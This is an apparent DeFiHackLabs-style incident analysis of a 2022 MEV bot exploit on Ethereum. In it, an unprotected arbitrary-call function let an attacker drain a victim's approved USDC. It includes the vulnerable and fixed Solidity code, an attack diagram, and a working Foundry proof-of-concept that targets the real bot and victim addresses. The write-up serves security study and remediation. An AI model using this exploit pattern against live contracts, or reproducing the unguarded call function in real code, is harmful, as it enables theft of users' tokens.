# MEV Bot 0x0AD8 — Arbitrary External Call Victim Allowance Drain Attack Analysis

| Field | Details |
|------|------|
| **Date** | 2022-11 |
| **Protocol** | MEV Bot 0x0AD8 |
| **Chain** | Ethereum Mainnet |
| **Loss** | Victim's entire USDC balance |
| **Vulnerable Contract** | [0x0AD8229D4bC84135786AE752B9A9D53392A8afd4](https://etherscan.io/address/0x0AD8229D4bC84135786AE752B9A9D53392A8afd4) |
| **Attacker** | [0xAE39A6c2379BEF53334EA968F4c711c8CF3898b6](https://etherscan.io/address/0xAE39A6c2379BEF53334EA968F4c711c8CF3898b6) |
| **Victim** | [0x211B6a1137BF539B2750e02b9E525CF5757A35aE](https://etherscan.io/address/0x211B6a1137BF539B2750e02b9E525CF5757A35aE) |
| **WETH** | [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2](https://etherscan.io/address/0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2) |
| **USDC** | [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48](https://etherscan.io/address/0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48) |
| **Root Cause** | MEV Bot function `0x090f88ca` executes arbitrary target and calldata without validation, draining victim's USDC allowance |
| **CWE** | CWE-284: Improper Access Control |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-11/MEV_0ad8_exp.sol) |

---
## 1. Vulnerability Overview

MEV Bot `0x0AD8` contained a function (selector `0x090f88ca`) that executed arbitrary external calls. The function allowed the call target address and calldata to be controlled externally with no validation whatsoever. The attacker identified victim `0x211B6a` who had granted a USDC approval to the MEV Bot, then crafted a payload with `target=USDC, calldata=transferFrom(victim, attacker, amount)` and called `0x090f88ca`. The MEV Bot executed `USDC.transferFrom(victim, attacker, amount)` on the victim's behalf, draining the victim's entire USDC balance. This pattern is structurally identical to the earlier MEV Bot 0xa47b (Balancer) and MEV Bot 0xbaDc0dE (dYdX) attacks.

---
## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable MEV Bot - arbitrary external call function (selector 0x090f88ca)
contract MEVBot_0x0AD8 {
    address owner;

    // ❌ Callable by anyone - no validation of target or calldata
    // function selector: 0x090f88ca
    function execute(
        address target,      // ❌ arbitrary contract address
        bytes calldata data  // ❌ arbitrary calldata
    ) external payable {
        // ❌ No msg.sender == owner check
        // Executes arbitrary external call as MEV Bot
        (bool success,) = target.call{value: msg.value}(data);
        require(success, "Call failed");
    }
}

// ✅ Correct pattern - onlyOwner access control
contract SafeMEVBot {
    address public owner;

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    // ✅ Only owner can execute arbitrary calls
    function execute(
        address target,
        bytes calldata data
    ) external payable onlyOwner {
        (bool success,) = target.call{value: msg.value}(data);
        require(success, "Call failed");
    }
}
```

---
### On-Chain Original Code

Source: Bytecode decompiled


**MEV_decompiled.sol** — Entry point:
```solidity
// ❌ Root cause: MEV Bot function `0x090f88ca` executes arbitrary target·calldata without validation, draining victim's USDC allowance
    function transferFrom(address arg0, address arg1, uint256 arg2) external {}  // 0x23b872dd  // ❌ unauthorized transferFrom
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
    │
    ├─[1] Identify victim
    │       victim = 0x211B6a1137BF539B2750e02b9E525CF5757A35aE
    │       USDC.allowance(victim, MEVBot_0x0AD8) > 0
    │       victimUSDC = USDC.balanceOf(victim)
    │
    ├─[2] Craft payload:
    │       target = USDC contract
    │       data   = transferFrom(victim, attacker, victimUSDC)
    │
    ├─[3] Call MEVBot.execute(target=USDC, data=transferFrom(victim, attacker, all))
    │       function selector: 0x090f88ca
    │       ❌ No access control
    │       → MEVBot executes USDC.transferFrom(victim, attacker, victimUSDC)
    │       → MEVBot uses allowance where msg.sender = victim
    │
    └─[4] Victim's entire USDC balance drained
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

interface IMEVBot {
    // ❌ selector 0x090f88ca - arbitrary external call
    function execute(address target, bytes calldata data) external payable;
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
}

contract MEV0ad8Exploit is Test {
    IMEVBot mevBot = IMEVBot(0x0AD8229D4bC84135786AE752B9A9D53392A8afd4);
    IERC20  USDC   = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);

    address victim  = 0x211B6a1137BF539B2750e02b9E525CF5757A35aE;

    function setUp() public {
        vm.createSelectFork("mainnet", 15_926_096);
    }

    function testExploit() public {
        emit log_named_decimal_uint("[Start] Attacker USDC", USDC.balanceOf(address(this)), 6);
        emit log_named_decimal_uint("[Start] Victim USDC", USDC.balanceOf(victim), 6);
        emit log_named_decimal_uint("[Start] Victim allowance", USDC.allowance(victim, address(mevBot)), 6);

        // [Step 1] Check victim's allowance and balance
        uint256 allowance = USDC.allowance(victim, address(mevBot));
        uint256 balance   = USDC.balanceOf(victim);
        uint256 amount    = allowance < balance ? allowance : balance;

        // [Step 2] Craft transferFrom payload
        bytes memory payload = abi.encodeWithSelector(
            bytes4(keccak256("transferFrom(address,address,uint256)")),
            victim,          // ← from: victim
            address(this),   // ← to:   attacker
            amount           // ← full amount
        );

        // [Step 3] Call MEV Bot's execute() - no access control
        // ⚡ MEV Bot executes USDC.transferFrom(victim, attacker, amount)
        mevBot.execute(address(USDC), payload);

        emit log_named_decimal_uint("[End] Attacker USDC", USDC.balanceOf(address(this)), 6);
        emit log_named_decimal_uint("[End] Victim USDC", USDC.balanceOf(victim), 6);
    }
}
```

---
## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | MEV Bot arbitrary external call missing access control |
| **CWE** | CWE-284: Improper Access Control |
| **OWASP DeFi** | Arbitrary Call Vulnerability (victim allowance drain) |
| **Attack Vector** | `execute(USDC, transferFrom(victim, attacker, all))` |
| **Prerequisites** | Victim has approved USDC to MEV Bot, `execute()` has no access control |
| **Impact** | Victim's entire USDC balance drained |

---
## 6. Remediation Recommendations

1. **onlyOwner Access Control**: Arbitrary call functions in MEV Bots must apply `onlyOwner` or equivalent access control so only the owner can invoke them.
2. **Whitelist-Based Calls**: Restrict callable target contracts and selectors to a pre-registered allowlist.
3. **Block Token Manipulation Selectors**: Add `transferFrom`, `transfer`, and `approve` selectors to a blocklist.

---
## 7. Lessons Learned

- **Recurring MEV Bot Vulnerability**: MEV Bot 0xbaDc0dE (dYdX, 2022-09), MEV Bot 0xa47b (Balancer, 2022-10), and MEV Bot 0x0AD8 (2022-11) all share the same vulnerability: missing access control on an arbitrary external call function. This pattern is especially prevalent in automated trading bots and warrants particular vigilance.
- **Persistent Risk of Token Approvals**: A token approval once granted remains valid until explicitly revoked. If a MEV Bot becomes vulnerable, all victims who have approved that bot are at risk of losing their assets.
- **Audit Private MEV Bot Code**: Privately operated MEV Bots often lack formal audits. Even when an arbitrary call capability is necessary, access control must always be enforced.